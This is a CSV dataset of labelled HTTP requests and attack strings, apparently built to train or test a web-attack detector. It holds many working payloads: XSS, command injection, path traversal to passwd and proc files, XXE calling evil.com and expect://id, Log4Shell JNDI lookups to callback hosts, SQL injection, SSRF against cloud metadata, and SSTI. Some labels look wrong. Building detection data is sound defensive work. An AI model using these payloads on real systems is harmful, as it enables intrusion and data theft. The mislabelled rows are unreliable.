payload,label,source
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=205F97CDA0108C78647EFEAC0107AD55 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=90D6E42EA52E3FADDC0305C5105AE631 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=neene&password=tridente&nombre=Sonsoles&apellidos=C%E1rcova+Valentini&email=baston_lory%40provider.com.mk&dni=75169095N&direccion=C%2F+De+Puigcerda+S%2FN%2C+1-G&ciudad=San+Salvador&cp=46593&provincia=Zaragoza&ntc=4279654044611256&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=B2418E5A64E37BC31F6921ADDEEAB5C9 Connection: close",normal,csic_2010
${q*23},ssti,augmented
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",xss,seclists
%20echo%20QQZCOQ$((29%2B94))$(echo%20QQZCOQ)QQZCOQ\,command_injection,seclists
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tilley&password=co2tRArRoTura&nombre=Arian&apellidos=Roig+Batlle&email=stiener%40apuestatealgo.coop&dni=71753940N&direccion=C%2F+Vicente+Agusti+152+3%3FD&ciudad=Isla+Mayor&cp=09199&provincia=%C1vila&ntc=0281286910316978&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6A45969E9E7C1C495EC0491F73646EEE Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BDF4E991DC1539523241E12F3B49A3A2 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6D5555631609C8F137DF4258C3C51D69 Connection: close",normal,csic_2010
/etc/pam.d/vsftpd,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F6CFC41B93E2585CFE08B4925CF2832A Connection: close",normal,csic_2010
C:\Users\All Users\AppData\Local\Temp\dd_setup_20200921070620_339_microsoft.visualstudio.templates.cs.edgedrivertest.log,path_traversal,seclists
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8D5B9DAF798B2D0B8511F0F2762DD0F9 Connection: close",normal,csic_2010
../proc/self/fd/33%00,path_traversal,seclists
%7C%20%5B%205%20-ne%20%24%28echo%20RUNALC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C,command_injection,seclists
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9FA002AAF7115C596747ADD1DBA38590 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
%2e.%25c1%259c%2e.%25c1%259c%2e.%25c1%259c%2e.%25c1%259cetc%25c1%259cpasswd,path_traversal,payloads_all_the_things
%252e%252e%%32%%66%252e%252e%%32%%66%252e%252e%%32%%66etc%%32%%66passwd,path_traversal,payloads_all_the_things
C:\Program Files\IceWarp\html\webmail\language\el\data.xml,path_traversal,seclists
../../../../usr/local/cpanel/logs/access_log,path_traversal,seclists
"<style>:target {transform: rotate(180deg);}</style><xmp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xmp>",xss,seclists
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5AA8A8EED051C8496289368CE6F1EFAB Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chianfon&pwd=CedrIno&remember=off&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6BE1CE8021E26C3B9232539BC45D5F64 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=28E0A226667278462D3EC7741882E2F4 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AE5B6455F05A143488EDBD6B908AA01D Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AB549CE38447428AA354A508EDE3F720 Connection: close",normal,csic_2010
"<tr oncopy=""alert(1)"" contenteditable>test</tr>",xss,seclists
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F0561659D045B3F1F6FFA4C12DD2CE86 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
Q�u'='�@�[�t�- o��_-!,sqli,payloads_all_the_things
%e0%80%ae%e0%80%ae%c1%pc%e0%80%ae%e0%80%ae%c1%pc%e0%80%ae%e0%80%ae%c1%pc%e0%80%ae%e0%80%ae%c1%pc%e0%80%ae%e0%80%ae%c1%pcetc%c1%pcissue,path_traversal,payloads_all_the_things
"<?xml version=""1.0""?><!DOCTYPE data [<!evil129 evil129 SYSTEM ""expect://id"">]><data>&evil129;</data>",xxe,augmented
/etc/freeradius/dictionary,path_traversal,seclists
**Warning**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`,xss,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C176DE98BAAD6A07B28F1DB57A54EC90 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=10A718A3E4A769599144880319355433 Connection: close",normal,csic_2010
"<!DOCTYPE foo [<!file490 file490 PUBLIC ""-//ATT//DTD//EN"" ""http://evil.com/evil.dtd"">]><foo>&file490;</foo>",xxe,augmented
../../../../../../../../../../../../../proc/self/status%00,path_traversal,seclists
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=525E2A90768FA0F7267B689C86150300 Connection: close",normal,csic_2010
Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`,ssrf,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=5075&B1=Pasar+por+caja HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=03BE89ABE4DA006C7535492A42DB62D9 Connection: close",sqli,csic_2010
%5C../%5C../%5C../boot.ini,path_traversal,payloads_all_the_things
${j${::-n}di:ldaps://callback.net:80/a},log4shell,augmented
Referer: ${jndi:ldap://interact.sh:1099/shell},log4shell,augmented
'or''=',sqli,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/salir.jsp.old HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8763C1342CCB06E0D995062B30691A12 Connection: close",sqli,csic_2010
/etc/mono/config,path_traversal,seclists
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts,path_traversal,payloads_all_the_things
C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\functions\inmodulescope.ps1,path_traversal,seclists
%0A%20str%3D%24%28echo%20KQPSND%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,command_injection,seclists
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=794&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6546F753575D39113D7E41C5DAD63EB2 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8CF9A361846B60621BF2D3648814F267 Connection: close",normal,csic_2010
..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%afetc%f8%80%80%80%afpasswd,path_traversal,payloads_all_the_things
modo=insertar&precio=6421&B1=Confirmar,normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lander&password=ner%D3n&nombre=H%E9ctor&apellidos=Cabezon+Huguet&email=gerritsen%40isbn.com.ac&dni=05385749T&direccion=Teucro+173+&ciudad=Cilleruelo+de+Arriba&cp=26111&provincia=%C1vila&ntc=9510066940047768&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C5A7AADC764DC09055CDE59EA57D1732 Connection: close",normal,csic_2010
"<object onkeypress=""alert(1)"" contenteditable>test</object>",xss,seclists
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9C93539E3AC2F1930FAB7842B181B18D Connection: close",normal,csic_2010
%uff0e%uff0e%c1%pc%uff0e%uff0e%c1%pcetc%c1%pcpasswd,path_traversal,payloads_all_the_things
"<?xml version=""1.0""?><!DOCTYPE data [<!evil361 evil361 SYSTEM ""expect://id"">]><data>&evil361;</data>",xxe,augmented
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gaftea&password=5a4a84e8a&nombre=Luciano&apellidos=Sarri%E0+Orbe&email=hartmann%40softstylestudio.sa&dni=72932222G&direccion=C%2F+Santo+Domingo+13+10%3FB&ciudad=Camponaraya&cp=25576&provincia=Lleida&ntc=9047664799943774&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=965CD1986D966567DA94BA5E97AB8C3D Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=63C3B604809DFF21647ACD89B78DCBCA Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
modo=entrar&login=miceli&pwd=bruJEsCa&remember=on&B1=Entrar,normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=167024BA30688BFF8B7A2C9143CB1B7E Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8952854FB95B5FDF7281E37EF882502F Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080.INC HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=91351E9F82FEC1B9CD20D773BDFC2D26 Connection: close",sqli,csic_2010
query=2&&id,command_injection,augmented
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dhaliwal&password=la67t2na&nombre=Adelardo&apellidos=Robirosa+Aniceto&email=shankar%40biosoftware.kr&dni=69235770C&direccion=C%2F+Fartaritx+170+&ciudad=Montserrat&cp=10374&provincia=Barce%2F%3Flona&ntc=3896895400259241&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=19B72E9380F9745A30001B9F478A9B36 Connection: close",sqli,csic_2010
